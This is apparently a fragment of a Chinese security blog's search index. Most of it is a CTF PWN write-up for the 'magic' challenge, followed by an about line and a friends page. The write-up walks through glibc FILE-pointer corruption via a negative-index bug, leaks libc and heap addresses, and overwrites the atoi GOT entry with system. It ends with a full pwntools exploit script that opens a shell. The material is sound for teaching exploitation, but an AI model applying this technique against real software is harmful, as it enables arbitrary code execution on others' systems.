使其指向atoi_got ，但这是不行的。 回想最开始的一句话，再重复一遍予以强调。 在读操作中，我们只能修改写相关的指针，如_IO_write_base/_IO_write_ptr 等 而在写操作中，我们只能修改读相关指针，如_IO_read_base/_IO_read_ptr等 具体原因可以在源码中看到，当我们调用写函数并试图修改写指针，写操作完成后_IO_write_ptr 会再一次被覆盖，变回了原来的正常情况地址；读函数也类似。在上面的利用过程可以看到我们是利用fwrite 修改_IO_read_ptr ，所以才能成功泄露。也就是说，如果我们想改写atoi_got 表项，我们应该利用fread 改写_IO_write_ptr 。 源码分析 这里我们解释一下为什么，笔者说说自己的看法，当然如果耐心看看源码可能会有新的理解，下列代码节选自_IO_new_file_xsputn ，也即fwrite 核心实现函数。 ... if ((f-\u003e_flags \u0026 _IO_LINE_BUF) \u0026\u0026 (f-\u003e_flags \u0026 _IO_CURRENTLY_PUTTING)) count = f-\u003e_IO_buf_end - f-\u003e_IO_write_ptr; else if (f-\u003e_IO_write_end \u003e f-\u003e_IO_write_ptr) count = f-\u003e_IO_write_end - f-\u003e_IO_write_ptr; ... ... // 利用memcpy实现写，其中s为data地址 #ifdef _LIBC f-\u003e_IO_write_ptr = __mempcpy(f-\u003e_IO_write_ptr, s, count); #else memcpy(f-\u003e_IO_write_ptr, s, count); f-\u003e_IO_write_ptr += count; 我们想想如果在fwrite 中想改变_IO_write_ptr为A会发生什么，在执行__memcpy 前_IO_write_ptr均为原值B，但是s的内容为A（我们试图改变_IO_write_ptr为A），在__memcpy的过程中_IO_write_ptr确实被改为A了，但不要忘了 还需要将它的返回值赋给_IO_write_ptr，所以_IO_write_ptr变回了B+count ，一如正常执行后的结果！至此我们明白了，为什么fwrite 改变_IO_write_ptr并不奏效。 回归正题 所以怎么利用fread 改写_IO_write_ptr，然后在下一次wizard_spell 中就能实现指定位置写呢？这里还是要从fread 源码入手，它的核心实现落到了_IO_file_xsgetn 上，部分源码如下 ... if (fp-\u003e_IO_read_ptr \u003c fp-\u003e_IO_read_end) return *(unsigned char *)fp-\u003e_IO_read_ptr; ... ... fp-\u003e_IO_read_base = fp-\u003e_IO_read_ptr = fp-\u003e_IO_buf_base; fp-\u003e_IO_read_end = fp-\u003e_IO_buf_base; fp-\u003e_IO_write_base = fp-\u003e_IO_write_ptr = fp-\u003e_IO_write_end = fp-\u003e_IO_buf_base; //调用系统接口读入 count = _IO_SYSREAD(fp, fp-\u003e_IO_buf_base, fp-\u003e_IO_buf_end - fp-\u003e_IO_buf_base); 这里我们首先得绕过第一个判断（不然不读了），然后发现它把很多FILE 指针的值都变为了_IO_buf_base ，包括 _IO_write_ptr。我们无法在fwrite 中顺利改变_IO_write_ptr，何不改变_IO_buf_base ，然后在调用fread 后就能改变_IO_write_ptr 了。尝试一下： spell(0, p64(log_file) + p64(heap + 0x200) * 3) spell(0, p64(atoi_got) + p64(atoi_got + 0xAAA)) 很遗憾，调试发现并没有改写成功。 我们想把_IO_buf_base 赋值为atoi_got ，然后让_IO_write_ptr 也变为这个值。再回头看看fwrite 源码不难发现，由于_IO_write_end 也被赋值为_IO_buf_base ，所以在fwrite 中count 为0，不会再读了！ if ((f-\u003e_flags \u0026 _IO_LINE_BUF) \u0026\u0026 (f-\u003e_flags \u0026 _IO_CURRENTLY_PUTTING)) { count = f-\u003e_IO_buf_end - f-\u003e_IO_write_ptr; ... } else if (f-\u003e_IO_write_end \u003e f-\u003e_IO_write_ptr) count = f-\u003e_IO_write_end - f-\u003e_IO_write_ptr; /* Space available. */ /* Then fill the buffer. */ if (count \u003e 0) { if (count \u003e to_do) count = to_do; #ifdef _LIBC f-\u003e_IO_write_ptr = __mempcpy(f-\u003e_IO_write_ptr, s, count); #else memcpy(f-\u003e_IO_write_ptr, s, count); f-\u003e_IO_write_ptr += count; 好了，所以我们最终如下操作，先把_IO_write_end 与_IO_write_ptr 都改为atoi_got + 143 ，最后再利用负下标漏洞把_IO_write_ptr 向下滑倒atoi_got -1，于是目的就达成了。 # change atoi to system spell(0, p64(log_file) + p64(heap + 0x200) * 3) spell(0, p64(atoi_got + 143) + p64(atoi_got + 0xAAA)) spell(-2, '\\x00') spell(-2, '\\x00' * 3) spell(-2, '\\x00' * 3) payload = '\\x00' + p64(system) spell(0, payload) ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:3:5","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"exp ubuntu16.04测试成功 #! /usr/bin/env python from pwn import * p = process('./magic') debug = 1 if debug: context.log_level = 'debug' elf = ELF('./magic') atoi_got = elf.got['atoi'] log_file = elf.sym['log_file'] libc = elf.libc def create(): p.sendlineafter('choice\u003e\u003e ', '1') p.sendlineafter(\"Give me the wizard's name:\", 'aaa') def spell(index, name): p.sendlineafter('choice\u003e\u003e ', '2') p.sendlineafter('Who will spell:', str(index)) p.sendafter('Spell name:', str(name)) def pause(p, s = 'pause'): return raw_input(s) context.terminal = ['tmux', 'splitw', '-h'] # gdb.attach(p) create() spell(0, 'aaa') #pause() # leak libc for i in range(11): spell(-2, '\\x00') spell(-2, '\\x00' * 11) spell(-2, '\\x00' * 11) spell(-2, '\\x00' * 11) payload = '\\x00' payload += p64(0xfbad24a8) spell(0,payload) payload = p64(atoi_got) + p64(atoi_got + 0x100) spell(0,payload) atoi_addr = u64(p.recv(8)) print hex(atoi_addr) # gdb.attach(p) offset= atoi_addr - libc.sym['atoi'] system = offset + libc.sym['system'] # leak heap spell(-2, '\\x00' * 0x10) spell(0, '\\x00' * 10 + p64(0xfbad24a8)) spell(0, p64(log_file) + p64(log_file + 0x50)) heap = u64(p.recvn(8)) - 0x10 print 'heap:',hex(heap) # change atoi to system spell(0, p64(log_file) + p64(heap + 0x200) * 3) spell(0, p64(atoi_got + 143) + p64(atoi_got + 0xAAA)) print \"atoi_got:\"+hex(atoi_got) spell(-2, '\\x00') spell(-2, '\\x00' * 3) spell(-2, '\\x00' * 3) payload = '\\x00' + p64(system) spell(0, payload) p.sendlineafter('choice\u003e\u003e ','$0') p.interactive() ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:3:6","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":null,"content":"Nobody, want to be somebody. 大胆迭代，小步试错，无限进步 ","date":"2019-08-02","objectID":"/about/:0:0","tags":null,"title":"About Me","uri":"/about/"},{"categories":null,"content":"These are my homies. Hope our stories will not end. 这里是有幸认识的部分同志与后浪，希望多年以后还能回想起我们之间发生的故事 ================================================================================ CTF同好，MISC@北航Lancet， 唯一一次相遇是在 ciscn2021 final. \rMobilis In Mobili\rLancet@BUAA\r\r\r\r================================================================================ 武大ACM选手，是一位追求细致与全面的学习家 \rMaple\rWuhan University\r\r\r\r================================================================================ Lilac 同届队长、Lilac 干饭精神创始人、年入百万的洛谷讲师、知乎大V。手把手教我焊过 PCB 板、在为数不多出席的几次课上玩过雀魂、炒过股的赛博神必人。天上懂一半，地上全都懂了属于是。 \r阮行止\rWeb\u0026Crypto@Lilac\r\r\r\r================================================================================ 流水的 Lilac，铁打的航神。企业名人、可靠的学长。祝博士学位攻读顺利！ \r王一航\rLilac 全能学长\r\r\r\r================================================================================ 直系学长，真的真的十分感谢带我入门 PWN，带我走近 Lilac，可以说是跟着葵佬从大一开始摸爬滚打过来的（我大一问的问题真的好弱智orz. 祝工作顺利，婚后生活幸福！ \rwxk\rPWN@Lilac\r\r\r\r================================================================================ 有素养有思想的学习家。校 MineCraft 建筑队成员. 2021郑州洪水与我父母被困在同一辆火车上2333. \rtrueKeuin\rWEB@Lilac\r\r\r\r================================================================================ 可靠的泉神。无私的资源分享者。祝打工快乐，WEB爷爷ddw. \r惊蛰\rWEB@Lilac\r\r\r\r================================================================================ 湖北老乡学长。秋豪爷爷带我挖洞带我科研呜呜😭 \r李秋豪\rTencent Blade Team\r\r\r\r================================================================================ 永远的宝哥。香港大学直博巨佬。自然语言处理带师，发顶会文章易如反掌。祝海外科研顺利！ \r谢天宝\rNLP Lab@HKU\r\r\r\r================================================================================ 哈工大开源软件协会会长。祝开源事业常青！开源万岁！ \rBillChen China\rWEB@Lilac\r\r\r\r================================================================================ 高中芜湖机场 OI 选手。ACM CTF 双线程选手。哈工大算法课程考试最高分之一。企业著名划水运动员。「这又何尝不是一种ntr呢」要素齐全。「三十五岁前赚够钱」的打工智者。苟富贵，勿相忘。岸桐，我的岸桐😭 希望有机会能教我算法，以及我觊觎你的 steam 账号很久了（ \rInitialize\rWEB@Lilac\r\r\r\r================================================================================ yink’s studio，Lilac 新兴势力 \ryink\rWEB@Lilac\r\r\r\r","date":"2019-08-02","objectID":"/friends/:0:0","tags":null,"title":"Memos","uri":"/friends/"}]